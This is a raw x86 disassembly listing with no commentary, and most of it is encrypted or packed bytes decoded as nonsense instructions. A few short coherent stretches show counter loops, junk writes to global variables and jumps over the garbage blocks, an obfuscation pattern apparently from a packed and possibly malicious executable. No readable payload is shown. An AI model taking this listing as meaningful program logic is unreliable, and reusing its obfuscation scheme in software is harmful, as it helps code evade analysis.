  40dc75:	xchg   ebp,esp
  40dc77:	fucom  st(6)
  40dc79:	clc    
  40dc7a:	pop    ebx
  40dc7b:	xchg   ecx,eax
  40dc7c:	pop    edx
  40dc7d:	dec    ebx
  40dc7e:	iret   
  40dc7f:	es gs fwait
  40dc82:	ja     0x40dc49
  40dc84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc85:	push   es
  40dc86:	adc    DWORD PTR [ebx+0x7dd43be7],eax
  40dc8c:	add    BYTE PTR [edi+0x471c1b50],ah
  40dc92:	xor    al,BYTE PTR [eax+edx*8-0xa]
  40dc96:	aam    0xe5
  40dc98:	pop    ds
  40dc99:	pop    ebx
  40dc9a:	push   0x3ff8649
  40dc9f:	loope  0x40dce9
  40dca1:	xchg   dh,dl
  40dca3:	stc    
  40dca4:	and    BYTE PTR [edi+0x53992732],dl
  40dcaa:	dec    edi
  40dcab:	out    0xdb,al
  40dcad:	mov    al,fs:0xcc3d7ba
  40dcb3:	ficomp WORD PTR ds:0xc4cd6b55
  40dcb9:	adc    eax,0x53aba59f
  40dcbe:	mov    ebp,0x1b923fa5
  40dcc3:	push   cs
  40dcc4:	sbb    DWORD PTR [edx-0x7b],ecx
  40dcc7:	or     DWORD PTR [eax+eax*8-0x34],esp
  40dccb:	add    al,0xf0
  40dccd:	pop    edx
  40dcce:	(bad)  
  40dccf:	and    eax,0x60b67736
  40dcd4:	jmp    0x40dcbe
  40dcd6:	in     eax,0x59
  40dcd8:	mov    ch,0x73
  40dcda:	sub    BYTE PTR [si],ch
  40dcdd:	mov    cl,0xad
  40dcdf:	adc    eax,0x5fcc4868
  40dce4:	mov    eax,0xd2558af4
  40dce9:	jecxz  0x40dcd0
  40dceb:	dec    edx
  40dcec:	ret    0xc7d6
  40dcef:	shl    DWORD PTR [esi],cl
  40dcf1:	aad    0x1f
  40dcf3:	lds    edx,FWORD PTR [edx-0x7f3e2ad]
  40dcf9:	push   ebp
  40dcfa:	stc    
  40dcfb:	sti    
  40dcfc:	mov    DWORD PTR [esi-0x2b5a0493],ecx
  40dd02:	ja     0x40dce2
  40dd04:	daa    
  40dd05:	dec    edx
  40dd06:	sbb    edi,DWORD PTR [edx]
  40dd08:	fdiv   DWORD PTR [ebx-0x2c]
  40dd0b:	fsubrp st(6),st
  40dd0d:	mov    ?,esi
  40dd0f:	adc    dl,BYTE PTR [ecx+0x1155f4ec]
  40dd15:	cmp    edi,0x55
  40dd18:	stos   DWORD PTR es:[edi],eax
  40dd19:	popa   
  40dd1a:	int3   
  40dd1b:	pop    ebp
  40dd1c:	xor    ebp,DWORD PTR [eax+0x1a4ed13b]
  40dd22:	mov    al,0xe1
  40dd24:	out    0xa3,al
  40dd26:	cmp    esi,DWORD PTR [ebx]
  40dd28:	in     al,dx
  40dd29:	mov    bh,0xf8
  40dd2b:	sub    BYTE PTR [esi],dh
  40dd2d:	jno    0x40dcf0
  40dd2f:	adc    eax,0xb9cebfcf
  40dd34:	imul   esp,DWORD PTR [eax-0x46d5fc11],0x50e6faa9
  40dd3e:	hlt    
  40dd3f:	push   ds
  40dd40:	sar    BYTE PTR [edi-0x54],0x97
  40dd44:	push   ecx
  40dd45:	mov    cl,bh
  40dd47:	pusha  
  40dd48:	xchg   edi,eax
  40dd49:	mov    ebx,0x178da7c4
  40dd4e:	loop   0x40dda1
  40dd50:	dec    edi
  40dd51:	fldcw  WORD PTR [edx+0x34]
  40dd54:	dec    esi
  40dd55:	pop    ds
  40dd56:	inc    esp
  40dd57:	addr16 dec ebx
  40dd59:	push   ebx
  40dd5a:	jns    0x40dd83
  40dd5c:	loope  0x40dd10
  40dd5e:	cli    
  40dd5f:	test   al,0x48
  40dd61:	jl     0x40dd4c
  40dd63:	cmc    
  40dd64:	jmp    0xb1c4:0x5195dbc0
  40dd6b:	shr    BYTE PTR [ebp-0x5f],0x8c
  40dd6f:	leave  
  40dd70:	or     ah,0x9a
  40dd73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd74:	pop    edx
  40dd75:	fnstsw WORD PTR [eax]
  40dd77:	and    eax,0x46110518
  40dd7c:	addr16 dec eax
  40dd7e:	std    
  40dd7f:	sub    BYTE PTR [ecx],bl
  40dd81:	inc    edx
  40dd82:	hlt    
  40dd83:	push   0x3
  40dd85:	(bad)  
  40dd86:	pop    ss
  40dd87:	ss cmp eax,0xbae89e83
  40dd8d:	xchg   BYTE PTR [edx+0x10180e7d],ch
  40dd93:	outs   dx,BYTE PTR ds:[esi]
  40dd94:	or     eax,0xb490a01
  40dd99:	stos   DWORD PTR es:[edi],eax
  40dd9a:	jne    0x40ddeb
  40dd9c:	sub    dl,dl
  40dd9e:	call   0x2592f7a7
  40dda3:	dec    esp
  40dda4:	jmp    0xd9ed:0xcf1dc0b6
  40ddab:	jl     0x40dd5b
  40ddad:	or     al,0x90
  40ddaf:	mov    edx,0xff9d46bc
  40ddb4:	test   ch,dl
  40ddb6:	pop    edi
  40ddb7:	adc    eax,0x748eeec5
  40ddbc:	add    edx,ecx
  40ddbe:	test   al,0x5f
  40ddc0:	add    edi,DWORD PTR [eax+0x6a6416b2]
  40ddc6:	xchg   BYTE PTR [ebp+0x63],bl
  40ddc9:	add    edi,DWORD PTR [ecx+0x30fd9994]
  40ddcf:	cmp    DWORD PTR [edi-0x5edd6cef],eax
  40ddd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddd6:	push   edi
  40ddd7:	sbb    al,0xc9
  40ddd9:	push   0xffffffed
  40dddb:	sub    eax,0x13006343
  40dde0:	dec    eax
  40dde1:	adc    al,0xbc
  40dde3:	in     al,dx
  40dde4:	inc    eax
  40dde5:	push   0x37
  40dde7:	mov    edi,0x8b65a43c
  40ddec:	xrelease xchg DWORD PTR [ebp-0x31],ecx
  40ddf0:	sbb    al,0x33
  40ddf2:	xor    bh,dh
  40ddf4:	test   BYTE PTR [ecx+0x2481a77],0xb1
  40ddfb:	push   0x3b76d63d
  40de00:	lds    ebx,FWORD PTR [edx-0x11]
  40de03:	push   ebp
  40de04:	mov    cl,0x36
  40de06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de07:	cmp    al,0xc2
  40de09:	and    al,0xfa
  40de0b:	int    0x66
  40de0d:	adc    al,BYTE PTR [ecx+0x3]
  40de10:	repnz fadd QWORD PTR [edx-0x22]
  40de14:	pop    ebx
  40de15:	mov    ebp,0xcf809957
  40de1a:	cld    
  40de1b:	rcr    bl,cl
  40de1d:	sub    DWORD PTR [edx+0x3],ecx
  40de20:	(bad)  
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43371f,0x0
  40de5a:	mov    eax,ds:0x43371f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43371f,eax
  40de65:	cmp    DWORD PTR ds:0x43371f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43371f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43376f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	mul    DWORD PTR [ecx+eax*8]
  40dea8:	sub    BYTE PTR [edx],bh
  40deaa:	mov    edx,0x127e7e9c
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40dee7
  40deb3:	out    dx,al
  40deb4:	cs dec edi
  40deb6:	loop   0x40deb5
  40deb8:	(bad)  
  40deb9:	pop    edx
  40deba:	daa    
  40debb:	mov    ch,0x94
  40debd:	(bad)  
  40debe:	dec    esp
  40debf:	lods   eax,DWORD PTR ds:[esi]
  40dec0:	imul   edx,DWORD PTR [edi],0xffffff92
  40dec3:	xor    BYTE PTR [edi],dl
  40dec5:	cwde   
  40dec6:	jnp    0x40debf
  40dec8:	sahf   
  40dec9:	arpl   WORD PTR [edx],si
  40decb:	and    ecx,ebx
  40decd:	je     0x40df0e
  40decf:	xor    edx,DWORD PTR [edx-0x540004c]
  40ded5:	sub    al,0xbf
  40ded7:	ds xor al,0x58
  40deda:	nop
  40dedb:	das    
  40dedc:	push   edi
  40dedd:	lahf   
  40dede:	push   ebx
  40dedf:	add    ah,al
  40dee1:	pop    ss
  40dee2:	dec    ecx
  40dee3:	inc    ebx
  40dee4:	pusha  
  40dee5:	ja     0x40dee4
  40dee7:	nop
  40dee8:	sub    al,0x14
  40deea:	dec    ecx
  40deeb:	jmp    0x16bda0ec
  40def0:	and    esp,0xad5b0093
  40def6:	cmc    
  40def7:	push   ecx
  40def8:	pop    cx
  40defa:	outs   dx,DWORD PTR ds:[esi]
  40defb:	xor    DWORD PTR [ebx+0x64],0xb361c93f
  40df02:	das    
  40df03:	sub    dh,dh
  40df05:	xor    dl,BYTE PTR [eax*2-0x3aeb40f]
  40df0c:	cmp    bl,BYTE PTR ds:0x5180e8c0
  40df12:	jne    0x40df01
  40df14:	jb     0x40deff
  40df16:	mov    ch,0x17
  40df18:	push   ds
  40df19:	pop    esp
  40df1a:	repnz dec eax
  40df1c:	push   ds
  40df1d:	jmp    0x9cef6393
  40df22:	leave  
  40df23:	push   ss
  40df24:	sbb    BYTE PTR ds:0xaef8ee29,0x3e
  40df2b:	dec    ebx
  40df2c:	inc    ebx
  40df2d:	and    al,0x52
  40df2f:	dec    edx
  40df30:	imul   ebx,DWORD PTR [edi],0x59
  40df33:	xor    bh,bh
  40df35:	adc    ebx,DWORD PTR [esi-0x6972248f]
  40df3b:	imul   edx,DWORD PTR ds:0xe0918ad0,0xffffff8a
  40df42:	push   eax
  40df43:	inc    eax
  40df44:	(bad)  
  40df45:	xchg   edi,eax
  40df46:	mov    cl,0xd2
  40df48:	dec    ebp
  40df49:	inc    eax
  40df4a:	(bad)  
  40df4b:	repnz and BYTE PTR [esp+ebx*4],ch
  40df4f:	std    
  40df50:	cmp    al,bl
  40df52:	leave  
  40df53:	daa    
  40df54:	mov    ecx,0x79732572
  40df59:	sbb    eax,0xfd662ef5
  40df5e:	gs ja  0x40dfc4
  40df61:	jl     0x40dfb0
  40df63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df64:	inc    eax
  40df65:	jl     0x40dfd4
  40df67:	dec    esp
  40df68:	mov    ch,cl
  40df6a:	call   0xef59d2fb
  40df6f:	push   ebp
  40df70:	mov    WORD PTR [esi+edi*1-0x5a],cs
  40df74:	mov    bl,BYTE PTR [edi]
  40df76:	mov    esi,0x4c3b4887
  40df7b:	(bad)  
  40df7c:	into   
  40df7d:	(bad)  
  40df7e:	fsub   st,st(4)
  40df80:	and    cl,dl
  40df82:	push   ss
  40df83:	and    eax,0x19245e6b
  40df88:	sbb    DWORD PTR [ebp-0x66],ebx
  40df8b:	jle    0x40dfc0
  40df8d:	pushf  
  40df8e:	mov    esp,0x3df1791
  40df93:	sub    bl,bh
  40df95:	cmp    DWORD PTR [esi-0x293e9140],esi
  40df9b:	test   ah,ch
  40df9d:	test   eax,0x8eafb71e
  40dfa2:	fsub   DWORD PTR [edx]
  40dfa4:	dec    esp
  40dfa5:	jp     0x40e004
  40dfa7:	sti    
  40dfa8:	in     al,dx
  40dfa9:	aad    0x1d
  40dfab:	jmp    0xaffa:0x2f7c9327
  40dfb2:	lods   eax,DWORD PTR ds:[esi]
  40dfb3:	xor    BYTE PTR [ecx+ebx*1-0x35419c7],dh
  40dfba:	mov    bh,0xf0
  40dfbc:	and    eax,0x9f05e8a6
  40dfc1:	mov    ebp,0xf4b73cd8
  40dfc6:	div    DWORD PTR [ecx+0x2054fb4a]
  40dfcc:	inc    esi
  40dfcd:	jl     0x40df5a
  40dfcf:	inc    ebp
  40dfd0:	or     BYTE PTR [ecx+0x4337172d],al
  40dfd6:	add    BYTE PTR ds:0x53000006,ah
  40dfdc:	sub    DWORD PTR ds:0x43376b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	jae    0x40e07a
  40e005:	sbb    BYTE PTR [esi+ebx*2],0x9d
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40df91
  40e010:	jns    0x40e042
  40e012:	xor    dh,BYTE PTR [ebp+0x6ac0b8ad]
  40e018:	jl     0x40dfb8
  40e01a:	out    0x59,al
  40e01c:	test   DWORD PTR [ecx],eax
  40e01e:	(bad)  
  40e01f:	xchg   ecx,eax
  40e020:	nop
  40e021:	cmp    ebx,esp
  40e023:	fstp   QWORD PTR [eax]
  40e025:	fiadd  WORD PTR ss:[eax-0x5a0b0ed7]
  40e02c:	(bad)  
  40e02d:	jg     0x40e053
  40e02f:	lds    esp,FWORD PTR [eax-0x53f66607]
  40e035:	or     bl,bl
  40e037:	scas   al,BYTE PTR es:[edi]
  40e038:	inc    edi
  40e039:	shl    DWORD PTR [ecx-0x50],0xdd
  40e03d:	fs xor dl,cl
  40e040:	in     eax,dx
  40e041:	(bad)  
  40e042:	cdq    
  40e043:	xlat   BYTE PTR ds:[ebx]
  40e044:	das    
  40e045:	push   0x832649bd
  40e04a:	pop    es
  40e04b:	aaa    
  40e04c:	repz (bad) 
  40e04e:	dec    ebp
  40e04f:	pushf  
  40e050:	jno    0x40e066
  40e052:	retf   
  40e053:	dec    eax
  40e054:	call   0x8e73d886
  40e059:	dec    edx
  40e05a:	out    0xb3,al
  40e05c:	mov    dh,BYTE PTR [esi]
  40e05e:	and    al,BYTE PTR [esi+0x4d8aea37]
  40e064:	and    al,BYTE PTR [ecx+0x13b29f84]
  40e06a:	ins    DWORD PTR es:[edi],dx
  40e06b:	or     BYTE PTR [edi+0x4a70e3f],dh
  40e071:	jno    0x40e042
  40e073:	icebp  
  40e074:	and    ebp,DWORD PTR [ebx]
  40e076:	(bad)  
  40e077:	push   DWORD PTR [edx-0x5289ed80]
  40e07d:	outs   dx,BYTE PTR ds:[esi]
  40e07e:	loop   0x40e0e9
  40e080:	sub    al,BYTE PTR [esp+edx*8+0x59]
  40e084:	repz lock mov dh,0x67
  40e088:	sbb    al,0x1f
  40e08a:	and    al,dh
  40e08c:	out    0x18,al
  40e08e:	or     ah,dl
  40e090:	adc    BYTE PTR [ebx+0x45],dl
  40e093:	mov    ds,WORD PTR ds:0xbc152136
  40e099:	lahf   
  40e09a:	into   
  40e09b:	in     al,0xa
  40e09d:	add    al,0xb5
  40e09f:	push   esp
  40e0a0:	sbb    bh,ch
  40e0a2:	sbb    edi,esi
  40e0a4:	push   0x47207f32
  40e0a9:	push   edi
  40e0aa:	iret   
  40e0ab:	jge    0x40e11e
  40e0ad:	lods   eax,DWORD PTR ds:[esi]
  40e0ae:	sub    ah,BYTE PTR [ebx-0x3cd43e14]
  40e0b4:	add    edi,DWORD PTR [ecx]
  40e0b6:	imul   esi,DWORD PTR [ecx],0x78
  40e0b9:	or     eax,0xdc4ea401
  40e0be:	and    al,0x52
  40e0c1:	jbe    0x40e047
  40e0c3:	jmp    DWORD PTR [ecx]
  40e0c5:	dec    ecx
  40e0c6:	jmp    0xf94e2599
  40e0cb:	imul   edi,esi,0xffffffbb
  40e0ce:	mov    al,0xe2
  40e0d0:	adc    eax,0x72707fcc
  40e0d5:	sbb    BYTE PTR [ebp-0x1a],dl
  40e0d8:	and    esp,ebp
  40e0da:	jmp    0x40e14a
  40e0dc:	mov    ah,0xb3
  40e0de:	data16 fsubr DWORD PTR [ecx+0x16470d8b]
  40e0e5:	xchg   esi,eax
  40e0e6:	xchg   esp,eax
  40e0e7:	sbb    eax,0x70f4d540
  40e0ec:	in     al,dx
  40e0ed:	sbb    bh,BYTE PTR [ecx+0x55362b96]
  40e0f3:	in     al,dx
  40e0f4:	push   esi
  40e0f5:	push   ss
  40e0f6:	xchg   ebp,eax
  40e0f7:	adc    ebp,DWORD PTR [ebx+0x5f]
  40e0fa:	fimul  DWORD PTR [eax+ecx*2]
  40e0fd:	popa   
  40e0fe:	inc    esi
  40e0ff:	jecxz  0x40e0b3
  40e101:	jno    0x40e102
  40e103:	hlt    
  40e104:	ja     0x40e0bf
  40e106:	mov    ch,0x40
  40e108:	and    al,ch
  40e10a:	add    ebx,ebx
  40e10c:	lods   al,BYTE PTR ds:[esi]
  40e10d:	icebp  
  40e10e:	fs es repnz push esp
  40e112:	push   esp
  40e113:	aam    0xc7
  40e115:	icebp  
  40e116:	bound  esp,QWORD PTR [eax+ecx*8-0x4c]
  40e11a:	adc    edx,DWORD PTR [bp+di+0x1d22]
  40e11f:	mov    edi,0xd7c96ef5
  40e124:	jmp    0xa212:0x79df86a6
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x433723,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x43376f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	retf   
  40e15b:	bound  ecx,QWORD PTR [ecx+0x7e9a7210]
  40e161:	jle    0x40e175
  40e163:	jg     0x40e1e3
  40e165:	jle    0x40e1e3
  40e167:	rol    DWORD PTR [eax+0x4b],1
  40e16a:	jns    0x40e1b6
  40e16c:	sub    DWORD PTR [edi+0x6bcdcc7],ecx
  40e172:	mov    BYTE PTR [esi+eiz*4],cl
  40e175:	stc    
  40e176:	pop    esp
  40e177:	dec    ecx
  40e178:	ins    BYTE PTR es:[edi],dx
  40e179:	stos   BYTE PTR es:[edi],al
  40e17a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e17b:	out    dx,al
  40e17c:	imul   edx,DWORD PTR [esi+edx*4+0x3d036771],0xbf59102d
  40e187:	add    esp,ecx
  40e189:	or     eax,0xee1af381
  40e18e:	jo     0x40e1ca
  40e190:	nop
  40e191:	or     eax,0xb4851483
  40e196:	inc    eax
  40e197:	xor    eax,0xfd71cbaa
  40e19c:	push   ebx
  40e19d:	js     0x40e12d
  40e19f:	into   
  40e1a0:	test   BYTE PTR [esi],ah
  40e1a2:	mov    ebp,DWORD PTR [ebx+0x33]
  40e1a5:	or     eax,DWORD PTR [ebx-0x40]
  40e1a8:	out    dx,al
  40e1a9:	aad    0x2e
  40e1ab:	adc    dh,BYTE PTR [ebx+0x343c6630]
  40e1b1:	pop    ecx
  40e1b2:	mov    ah,0x6e
  40e1b4:	mov    eax,ds:0xa40d98e5
  40e1b9:	int3   
  40e1ba:	pop    DWORD PTR ds:0xc562a945
  40e1c0:	jo     0x40e151
  40e1c2:	int    0xfb
  40e1c4:	sbb    al,bh
  40e1c6:	mov    ds:0xdc53e6d9,eax
  40e1cb:	jge    0x40e239
  40e1cd:	dec    eax
  40e1ce:	enter  0xe6d,0xa9
  40e1d2:	xor    al,0x31
  40e1d4:	arpl   WORD PTR [ebx-0x2f305b5a],ax
  40e1da:	(bad)  
  40e1db:	jge    0x40e22e
  40e1dd:	xchg   ebp,eax
  40e1de:	dec    eax
  40e1df:	dec    esp
  40e1e0:	int3   
  40e1e1:	mov    ch,BYTE PTR [edx]
  40e1e3:	push   ebx
  40e1e4:	dec    eax
  40e1e5:	or     DWORD PTR [ebx],ebx
  40e1e7:	and    eax,0x8b5f84c
  40e1ec:	jbe    0x40e1ea
  40e1ee:	sub    eax,0xc1f65287
  40e1f3:	jp     0x40e230
  40e1f5:	(bad)  
  40e1f6:	pop    ecx
  40e1f7:	xchg   esp,eax
  40e1f8:	fadd   QWORD PTR [ebp+0x73cde13e]
  40e1fe:	je     0x40e1ea
  40e200:	mov    eax,0x821ce8da
  40e205:	js     0x40e286
  40e207:	int    0x6c
  40e209:	fld    DWORD PTR [ecx+0x12dcb1fe]
  40e20f:	aas    
  40e210:	daa    
  40e211:	pop    ecx
  40e212:	or     ebp,edi
  40e214:	lock adc al,0xb3
  40e217:	push   0xed06cdf9
  40e21c:	sub    esi,DWORD PTR [edi+0x7c]
  40e21f:	sub    al,0x6b
  40e221:	jg     0x40e26e
  40e223:	aam    0x92
  40e225:	mov    al,0xd5
  40e227:	mov    ecx,0x2cda6391
  40e22c:	mov    WORD PTR ds:0x7a658743,es
  40e232:	cld    
  40e233:	mov    bh,bh
  40e235:	fcomp  DWORD PTR [ecx-0x56865f27]
  40e23b:	out    dx,eax
  40e23c:	xchg   ebp,eax
  40e23d:	add    al,0xc3
  40e23f:	push   ds
  40e240:	in     eax,dx
  40e241:	mov    eax,0x2a44bc9
  40e246:	sbb    bh,ch
  40e248:	mov    bh,0xdd
  40e24a:	push   ebx
  40e24b:	dec    edx
  40e24c:	cmp    BYTE PTR [edx-0x11],0x75
  40e250:	push   0xffffffea
  40e252:	mov    bl,0x85
  40e254:	aaa    
  40e255:	mov    dh,0x9e
  40e257:	jle    0x40e257
  40e259:	rol    ah,0x8c
  40e25c:	pusha  
  40e25d:	pop    ebp
  40e25e:	(bad)  [edx+0x1936c4b9]
  40e264:	xor    al,0xa
  40e266:	aaa    
  40e267:	sbb    bh,dl
  40e269:	mov    dl,0xac
  40e26b:	fs and al,0x20
  40e26e:	lds    eax,FWORD PTR [ecx]
  40e270:	or     ch,BYTE PTR es:[ebx-0x16]
  40e274:	adc    DWORD PTR [ebp+0x17],ecx
  40e277:	mov    edi,0xb2a1c6da
  40e27c:	xor    cl,BYTE PTR [esi]
  40e27e:	xlat   BYTE PTR ds:[ebx]
  40e27f:	stos   BYTE PTR es:[edi],al
  40e280:	sar    DWORD PTR [edi],1
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43368b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433763,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4337ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433717,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43368b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433757,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43371f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43369b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43379f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4337ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43375f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43379b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433757,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x4336d3,0x4336df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433727,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433753,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433757,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433683,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433683,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433717,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433683,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43372f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4337ab
  40e3da:	and    DWORD PTR ds:0x43368b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4336e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433793
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	cs add eax,0x98163804
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e491
  40e421:	mov    esp,0x7b5e1280
  40e426:	test   DWORD PTR [ecx],esp
  40e428:	imul   ebx,DWORD PTR ds:0xfa9bd376,0x2a
  40e42f:	scas   al,BYTE PTR es:[edi]
  40e430:	jmp    0x40e41a
  40e432:	push   ds
  40e433:	and    DWORD PTR [eax+eiz*1-0x4b571229],eax
  40e43a:	add    dl,BYTE PTR [esi-0x79c15258]
  40e440:	and    esi,esp
  40e442:	push   ecx
  40e443:	add    DWORD PTR [ebp-0x2091ac8],edi
  40e449:	add    ecx,DWORD PTR [ebx]
  40e44b:	rcr    bl,1
  40e44d:	mov    bl,0x36
  40e44f:	sub    eax,0x1ce649a9
  40e454:	outs   dx,BYTE PTR ds:[esi]
  40e455:	lock inc edx
  40e457:	xor    DWORD PTR [ebx-0x55],0xe
  40e45b:	mov    edi,DWORD PTR [esi+edi*2-0x1fffeca8]
  40e462:	imul   edx,esp,0x9aaeef6d
  40e468:	cld    
  40e469:	jl     0x40e422
  40e46b:	pop    es
  40e46c:	aas    
  40e46d:	mov    cl,BYTE PTR [eax-0x54d296d0]
  40e473:	adc    bh,BYTE PTR [esi+0x26]
  40e476:	dec    esi
  40e477:	jp     0x40e4c1
  40e479:	cli    
  40e47a:	in     eax,dx
  40e47b:	mov    al,0xff
  40e47d:	add    DWORD PTR [ebx],0x65
  40e480:	mov    ebp,0x4dcd814c
  40e485:	xchg   edx,eax
  40e486:	aam    0x30
  40e488:	push   0x31be8787
  40e48d:	push   edx
  40e48e:	pop    ebp
  40e48f:	xchg   esi,eax
  40e490:	and    ch,BYTE PTR [edi]
  40e492:	ja     0x40e4dc
  40e494:	add    BYTE PTR [edi],dl
  40e496:	aad    0x64
  40e498:	les    edx,FWORD PTR [eax]
  40e49a:	daa    
  40e49b:	jecxz  0x40e4a7
  40e49d:	shl    DWORD PTR [esi],cl
  40e49f:	add    DWORD PTR [edx+edi*4+0x105215c4],esp
  40e4a6:	sti    
  40e4a7:	mov    esi,0x887c8294
  40e4ac:	xchg   BYTE PTR [edi+0xd4a8ae8],dl
  40e4b2:	adc    al,0x36
  40e4b4:	(bad)  
  40e4b5:	in     al,dx
  40e4b6:	(bad)  
  40e4b7:	test   BYTE PTR [edx+0x65ac7ced],0xae
  40e4be:	dec    edx
  40e4bf:	push   cs
  40e4c0:	(bad)  
  40e4c1:	into   
  40e4c2:	fisttp DWORD PTR [ebx-0x337d0bf3]
  40e4c8:	int    0xe1
  40e4ca:	or     DWORD PTR [ebx+ebp*8-0x20],edx
  40e4ce:	retf   0x5bc3
  40e4d1:	(bad)  [ecx-0x57]
  40e4d4:	pushfw 
  40e4d6:	jge    0x40e4bf
  40e4d8:	pop    ss
  40e4d9:	xchg   edi,eax
  40e4da:	leave  
  40e4db:	stos   BYTE PTR es:[edi],al
  40e4dc:	mov    ds:0x73b580bf,al
  40e4e1:	sti    
  40e4e2:	dec    esp
  40e4e3:	push   cs
  40e4e4:	jno    0x40e557
  40e4e6:	ins    BYTE PTR es:[edi],dx
  40e4e7:	jp     0x40e545
  40e4e9:	rol    DWORD PTR [edx+0x3007a2a8],1
  40e4ef:	icebp  
  40e4f0:	mov    ebx,0x89b715e2
  40e4f5:	add    BYTE PTR [edx-0x21],bh
  40e4f8:	mov    bl,0x71
  40e4fa:	jae    0x40e4d2
  40e4fc:	int3   
